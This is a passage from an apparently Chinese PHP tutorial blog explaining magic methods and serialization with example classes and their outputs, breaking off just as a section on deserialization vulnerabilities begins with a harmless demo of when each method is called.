class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;icon_domain;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$ChildInstance</span>=<span class="keyword">new</span> <span class="title class_">Child_Site</span>(<span class="string">&quot;dustball.top&quot;</span>,<span class="string">&quot;the empire&quot;</span>,<span class="string">&quot;https://raw.githubusercontent.com/DeutschBall/test/master/emp.png&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="魔术方法">魔术方法</h3>
<p>PHP预留的以双下划线开头的类成员函数,它们是</p>
<blockquote>
<p><strong><a
target="_blank" rel="noopener" href="https://www.php.net/manual/zh/language.oop5.decon.php#object.construct">__construct()</a>
、 <a
target="_blank" rel="noopener" href="https://www.php.net/manual/zh/language.oop5.decon.php#object.destruct">__destruct()</a></strong>
、 <a
target="_blank" rel="noopener" href="https://www.php.net/manual/zh/language.oop5.overloading.php#object.call">__call()</a>
、 <a
target="_blank" rel="noopener" href="https://www.php.net/manual/zh/language.oop5.overloading.php#object.callstatic">__callStatic()</a>
、 <a
target="_blank" rel="noopener" href="https://www.php.net/manual/zh/language.oop5.overloading.php#object.get">__get()</a>
、 <a
target="_blank" rel="noopener" href="https://www.php.net/manual/zh/language.oop5.overloading.php#object.set">__set()</a>
、 <a
target="_blank" rel="noopener" href="https://www.php.net/manual/zh/language.oop5.overloading.php#object.isset">__isset()</a>
、 <a
target="_blank" rel="noopener" href="https://www.php.net/manual/zh/language.oop5.overloading.php#object.unset">__unset()</a>
、 <a
target="_blank" rel="noopener" href="https://www.php.net/manual/zh/language.oop5.magic.php#object.sleep">__sleep()</a>
、 <a
target="_blank" rel="noopener" href="https://www.php.net/manual/zh/language.oop5.magic.php#object.wakeup">__wakeup()</a>
、 <a
target="_blank" rel="noopener" href="https://www.php.net/manual/zh/language.oop5.magic.php#object.serialize">__serialize()</a>
、 <a
target="_blank" rel="noopener" href="https://www.php.net/manual/zh/language.oop5.magic.php#object.unserialize">__unserialize()</a>
、 <a
target="_blank" rel="noopener" href="https://www.php.net/manual/zh/language.oop5.magic.php#object.tostring">__toString()</a>
、 <a
target="_blank" rel="noopener" href="https://www.php.net/manual/zh/language.oop5.magic.php#object.invoke">__invoke()</a>
、 <a
target="_blank" rel="noopener" href="https://www.php.net/manual/zh/language.oop5.magic.php#object.set-state">__set_state()</a>
、 <a
target="_blank" rel="noopener" href="https://www.php.net/manual/zh/language.oop5.cloning.php#object.clone">__clone()</a>
、 <a
target="_blank" rel="noopener" href="https://www.php.net/manual/zh/language.oop5.magic.php#object.debuginfo">__debugInfo()</a></p>
</blockquote>
<h4
id="construct__destruct"><code>__construct&amp;&amp;__destruct</code></h4>
<p>只有在使用new关键字创建新对象的时候,<code>__construct</code>构造函数才会被自动调用</p>
<p><code>clone</code>拷贝或者<code>unserialize</code>反序列化都不会调用<code>__construc</code></p>
<p><code>__destruct</code>由系统自动调用,发生在对象生命期结束时</p>
<h4 id="tostring"><code>__toString()</code></h4>
<blockquote>
<p><a
target="_blank" rel="noopener" href="https://www.php.net/manual/zh/language.oop5.magic.php#object.tostring">__toString()</a>
方法用于一个类被当成字符串时应怎样回应。例如 <code>echo $obj;</code>
应该显示些什么。</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Site</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$domain</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$title</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$par1</span> = <span class="number">0</span>, <span class="variable">$par2</span> = <span class="number">0</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;domain = <span class="variable">$par1</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;title = <span class="variable">$par2</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;[&quot;</span>.<span class="variable language_">$this</span>-&gt;title.<span class="string">&quot;=&gt;&quot;</span>.<span class="variable language_">$this</span>-&gt;domain.<span class="string">&quot;]&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$mySite</span> = <span class="keyword">new</span> <span class="title class_">Site</span>(<span class="string">&quot;deutschball.github.io&quot;</span>, <span class="string">&quot;the republic&quot;</span>);</span><br><span class="line"><span class="keyword">print</span> <span class="variable">$mySite</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>运行结果</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[the republic=&gt;deutschball.github.io]</span><br></pre></td></tr></table></figure>
<h4 id="invoke"><code>__invoke()</code></h4>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">__invoke</span>( ...<span class="variable">$values</span>): <span class="keyword">mixed</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>当尝试以调用函数的方式调用一个对象时，<a
target="_blank" rel="noopener" href="https://www.php.net/manual/zh/language.oop5.magic.php#object.invoke">__invoke()</a>
方法会被自动调用。</p>
</blockquote>
<blockquote>
<p>相当于C++中的仿函数运算符<code>operator ()</code></p>
</blockquote>
<p>比如对于Site类的对象,直接当成函数调用的时候,访问域名</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Site</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$domain</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$title</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$par1</span> = <span class="number">0</span>, <span class="variable">$par2</span> = <span class="number">0</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;domain = <span class="variable">$par1</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;title = <span class="variable">$par2</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location:https://<span class="subst">$this</span>-&gt;domain&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$mySite</span> = <span class="keyword">new</span> <span class="title class_">Site</span>(<span class="string">&quot;dustball.top&quot;</span>, <span class="string">&quot;the republic&quot;</span>);</span><br><span class="line"><span class="variable">$mySite</span>();</span><br></pre></td></tr></table></figure>
<p>用浏览器访问本php文件,之后会跳转<code>dustball.top</code></p>
<h4
id="serialize__unserialize"><code>__serialize()&amp;&amp;__unserialize()</code></h4>
<p>自定义序列化键值对数组(没有卵用)的函数</p>
<blockquote>
<p><a
target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.serialize.php">serialize()</a>
函数会检查类中是否存在一个魔术方法 <a
target="_blank" rel="noopener" href="https://www.php.net/manual/zh/language.oop5.magic.php#object.serialize">__serialize()</a>
。</p>
<p>如果存在，该方法将在任何序列化之前<strong>优先执行</strong>。</p>
<p>它必须以一个代表对象序列化形式的 键/值 成对的关联数组形式来返回，</p>
<p>如果没有返回数组，将会抛出一个 <a
target="_blank" rel="noopener" href="https://www.php.net/manual/zh/class.typeerror.php">TypeError</a>
错误。</p>
<p><a
target="_blank" rel="noopener" href="https://www.php.net/manual/zh/language.oop5.magic.php#object.serialize">__serialize()</a>
的预期用途是定义对象序列化友好的任意表示。
数组的元素可能对应对象的属性，但是这并不是必须的。</p>
<p>相反， <a
target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.unserialize.php">unserialize()</a>
检查是否存在具有名为 <a
target="_blank" rel="noopener" href="https://www.php.net/manual/zh/language.oop5.magic.php#object.unserialize">__unserialize()</a>
的魔术方法。</p>
<p>此函数将会传递从 <a
target="_blank" rel="noopener" href="https://www.php.net/manual/zh/language.oop5.magic.php#object.serialize">__serialize()</a>
返回的恢复数组。然后它可以根据需要从该数组中恢复对象的属性。</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Site</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$domain</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$title</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$d</span> = <span class="number">0</span>, <span class="variable">$t</span> = <span class="number">0</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;domain = <span class="variable">$d</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;title = <span class="variable">$t</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__serialize</span>(<span class="params"></span>):<span class="title">array</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">print</span> <span class="string">&quot;__serialize acitved \n&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> [</span><br><span class="line">            <span class="string">&#x27;d&#x27;</span> =&gt; <span class="variable language_">$this</span>-&gt;domain,<span class="comment">//此处的键为&#x27;d&#x27;,则__unserialize中的键也应该是&#x27;d&#x27;,即$data[&#x27;d&#x27;]</span></span><br><span class="line">            <span class="string">&#x27;t&#x27;</span> =&gt; <span class="variable language_">$this</span>-&gt;title,</span><br><span class="line">        ];</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__unserialize</span>(<span class="params"><span class="keyword">array</span> <span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">print</span> <span class="string">&quot;__unserialize actived \n&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;domain = <span class="variable">$data</span>[<span class="string">&#x27;d&#x27;</span>];</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;title = <span class="variable">$data</span>[<span class="string">&#x27;t&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)//方便打印观察,重载<span class="title">invoke</span>函数</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;[&quot;</span>.<span class="variable language_">$this</span>-&gt;title.<span class="string">&quot;,&quot;</span>.<span class="variable language_">$this</span>-&gt;domain.<span class="string">&quot;]&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$mySite</span> = <span class="keyword">new</span> <span class="title class_">Site</span>(<span class="string">&quot;dustball.top&quot;</span>, <span class="string">&quot;the republic&quot;</span>);<span class="comment">//实例化</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$seri</span>=<span class="title function_ invoke__">serialize</span>(<span class="variable">$mySite</span>);<span class="comment">//序列化,返回字符串用$seri存放</span></span><br><span class="line"><span class="keyword">print</span> <span class="variable">$seri</span>.<span class="string">&quot;\n&quot;</span>;<span class="comment">//打印观察serialize函数执行结果</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$Site2</span>=<span class="title function_ invoke__">unserialize</span>(<span class="variable">$seri</span>);<span class="comment">//反序列化,使用serivalize的结果作为输入</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="variable">$Site2</span>();<span class="comment">//观察反序列化得到的实例</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>运行结果:</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">__serialize acitved </span><br><span class="line">O:4:&quot;Site&quot;:2:&#123;s:1:&quot;d&quot;;s:12:&quot;dustball.top&quot;;s:1:&quot;t&quot;;s:12:&quot;the republic&quot;;&#125;</span><br><span class="line">__unserialize actived </span><br><span class="line">[the republic,dustball.top]</span><br></pre></td></tr></table></figure>
<blockquote>
<p>序列化得到的字符串含义</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">对象:类名长度4:类名&quot;Site&quot;:两个成员:&#123;</span><br><span class="line">	字符串类型:长度6:键&quot;domain&quot;;字符串类型:字符串类型:长度12:值&quot;dustball.top&quot;;</span><br><span class="line">	字符串类型:长度5:键&quot;title&quot;;字符串类型:字符串类型:长度12:值&quot;the republic&quot;;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
</blockquote>
<p><code>__serialize和__unserialize</code>会影响键,这里键就只有一个字符,分别是"s","t"</p>
<blockquote>
<p><code>O:4:"Site":2:&#123;s:1:"d";s:12:"dustball.top";s:1:"t";s:12:"the republic";&#125;</code></p>
</blockquote>
<p>如果不显式<code>__serialize</code>,则键默认就是成员变量名,<code>"domain","title"</code></p>
<h4 id="sleep__wakeup"><code>__sleep()&amp;&amp;__wakeup()</code></h4>
<blockquote>
<p>如果已经显式<code>__serialize</code>则<code>__sleep</code>写了白写</p>
<p>如果已经显式<code>__unserialize</code>则<code>__wakeup</code>写了白写</p>
</blockquote>
<blockquote>
<p><a
target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.serialize.php">serialize()</a>
函数会检查类中是否存在一个魔术方法 <a
target="_blank" rel="noopener" href="https://www.php.net/manual/zh/language.oop5.magic.php#object.sleep">__sleep()</a>。如果存在，该方法会先被调用，然后才执行序列化操作。此功能可以用于清理对象，并返回一个包含对象中所有应被序列化的变量名称的数组。如果该方法未返回任何内容，则
<strong><code>null</code></strong> 被序列化，并产生一个
<strong><code>E_NOTICE</code></strong> 级别的错误。</p>
</blockquote>
<p><code>__sleep()&amp;&amp;__wakeup()</code>调用时机和<code>__serialize&amp;&amp;__unserialize</code>差不多,但是优先级不如后者,后者存在时不会调用前者</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Site</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$domain</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$title</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$d</span> = <span class="number">0</span>, <span class="variable">$t</span> = <span class="number">0</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;domain = <span class="variable">$d</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;title = <span class="variable">$t</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">print</span> <span class="string">&quot;__sleep acitved \n&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> [<span class="string">&#x27;domain&#x27;</span>,<span class="string">&#x27;title&#x27;</span>];<span class="comment">//此处只能写类成员键组成的数组,表示需要参与序列化的成员</span></span><br><span class="line">        <span class="comment">//return [&#x27;d&#x27;,&#x27;t&#x27;];如果这样写会报错,因为Site类没有d这个成员变量,应该写domain</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">print</span> <span class="string">&quot;__wakeup actived \n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>) //方便打印观察,重载<span class="title">invoke</span>函数</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;[&quot;</span> . <span class="variable language_">$this</span>-&gt;title . <span class="string">&quot;,&quot;</span> . <span class="variable language_">$this</span>-&gt;domain . <span class="string">&quot;]&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$mySite</span> = <span class="keyword">new</span> <span class="title class_">Site</span>(<span class="string">&quot;dustball.top&quot;</span>, <span class="string">&quot;the republic&quot;</span>); <span class="comment">//实例化</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$seri</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$mySite</span>); <span class="comment">//序列化,返回字符串用$seri存放</span></span><br><span class="line"><span class="keyword">print</span> <span class="variable">$seri</span> . <span class="string">&quot;\n&quot;</span>; <span class="comment">//打印观察serialize函数执行结果</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$Site2</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$seri</span>); <span class="comment">//反序列化,使用serivalize的结果作为输入</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="variable">$Site2</span>();<span class="comment">//观察反序列化得到的实例</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>运行结果</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">__sleep acitved </span><br><span class="line">O:4:&quot;Site&quot;:2:&#123;s:6:&quot;domain&quot;;s:12:&quot;dustball.top&quot;;s:5:&quot;title&quot;;s:12:&quot;the republic&quot;;&#125;</span><br><span class="line">__wakeup actived </span><br><span class="line">[the republic,dustball.top]</span><br></pre></td></tr></table></figure>
<p><code>serialize</code>函数会根据<code>__sleep</code>指定参与序列化的成员,进行序列化,这里指定了domain和title都参与实例化,也可以只指定domain参与,也可以都不参与,那么运行结果</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">print</span> <span class="string">&quot;__sleep acitved \n&quot;</span>;</span><br><span class="line">        <span class="comment">// return [&#x27;domain&#x27;,&#x27;title&#x27;];</span></span><br><span class="line">        <span class="keyword">return</span> [];<span class="comment">//都不参与实例化</span></span><br><span class="line">    &#125;</span><br><span class="line">...</span><br><span class="line">__sleep acitved </span><br><span class="line">O:<span class="number">4</span>:<span class="string">&quot;Site&quot;</span>:<span class="number">0</span>:&#123;&#125;</span><br><span class="line">__wakeup actived </span><br><span class="line">[,]</span><br></pre></td></tr></table></figure>
<h4 id="clone"><code>__clone</code></h4>
<p>作用是
实现深拷贝,在调用<code>clone</code>时默认调用<code>__clone</code>函数</p>
<h4
id="set__get__isset__unset"><code>__set&amp;&amp;__get&amp;&amp;&amp;__isset&amp;&amp;__unset</code></h4>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">public __set(string $name, [mixed]</span><br><span class="line"></span><br><span class="line">public __get(string $name): [mixed]</span><br><span class="line"></span><br><span class="line">public __isset(string $name): bool</span><br><span class="line"></span><br><span class="line">public __unset(string $name): void</span><br></pre></td></tr></table></figure>
<blockquote>
<p>在给不可访问（protected 或 private）或不存在的属性赋值时，<a
target="_blank" rel="noopener" href="https://www.php.net/manual/zh/language.oop5.overloading.php#object.set">__set()</a>
会被调用。</p>
<p>读取不可访问（protected 或 private）或不存在的属性的值时，<a
target="_blank" rel="noopener" href="https://www.php.net/manual/zh/language.oop5.overloading.php#object.get">__get()</a>
会被调用。</p>
<p>当对不可访问（protected 或 private）或不存在的属性调用 <a
target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.isset.php">isset()</a> 或
<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.empty.php">empty()</a>
时，<a
target="_blank" rel="noopener" href="https://www.php.net/manual/zh/language.oop5.overloading.php#object.isset">__isset()</a>
会被调用。</p>
<p>当对不可访问（protected 或 private）或不存在的属性调用 <a
target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.unset.php">unset()</a>
时，<a
target="_blank" rel="noopener" href="https://www.php.net/manual/zh/language.oop5.overloading.php#object.unset">__unset()</a>
会被调用。</p>
</blockquote>
<h2 id="反序列化漏洞">反序列化漏洞</h2>
<h3 id="魔术方法的调用时机">魔术方法的调用时机:</h3>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$varr1</span> = <span class="string">&quot;abc&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$varr2</span> = <span class="string">&quot;123&quot;</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">echoP</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;varr1 . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;__construct\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;__destruct\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;__toString\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;__sleep\n&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">array</span>(<span class="string">&#x27;varr1&#x27;</span>, <span class="string">&#x27;varr2&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;__wakeup\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> <span class="title function_ invoke__">test</span>(); <span class="comment">//实例化对象，调用__construct()方法，输出__construct</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$obj</span>-&gt;<span class="title function_ invoke__">echoP</span>();  <span class="comment">//调用echoP()方法，输出&quot;abc&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$obj</span>;  <span class="comment">//obj对象被当做字符串输出，调用__toString()方法，输出__toString</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$s</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$obj</span>); <span class="comment">//obj对象被序列化，调用__sleep()方法，输出__sleep</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">unserialize</span>(<span class="variable">$s</span>); <span class="comment">//$s首先会被反序列化，会调用__wake()方法，被反序列化出来的对象又被当做字符串，就会调用_toString()方法。</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 脚本结束又会调用__destruct()方法，输出__destruct</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>运行结果</p>
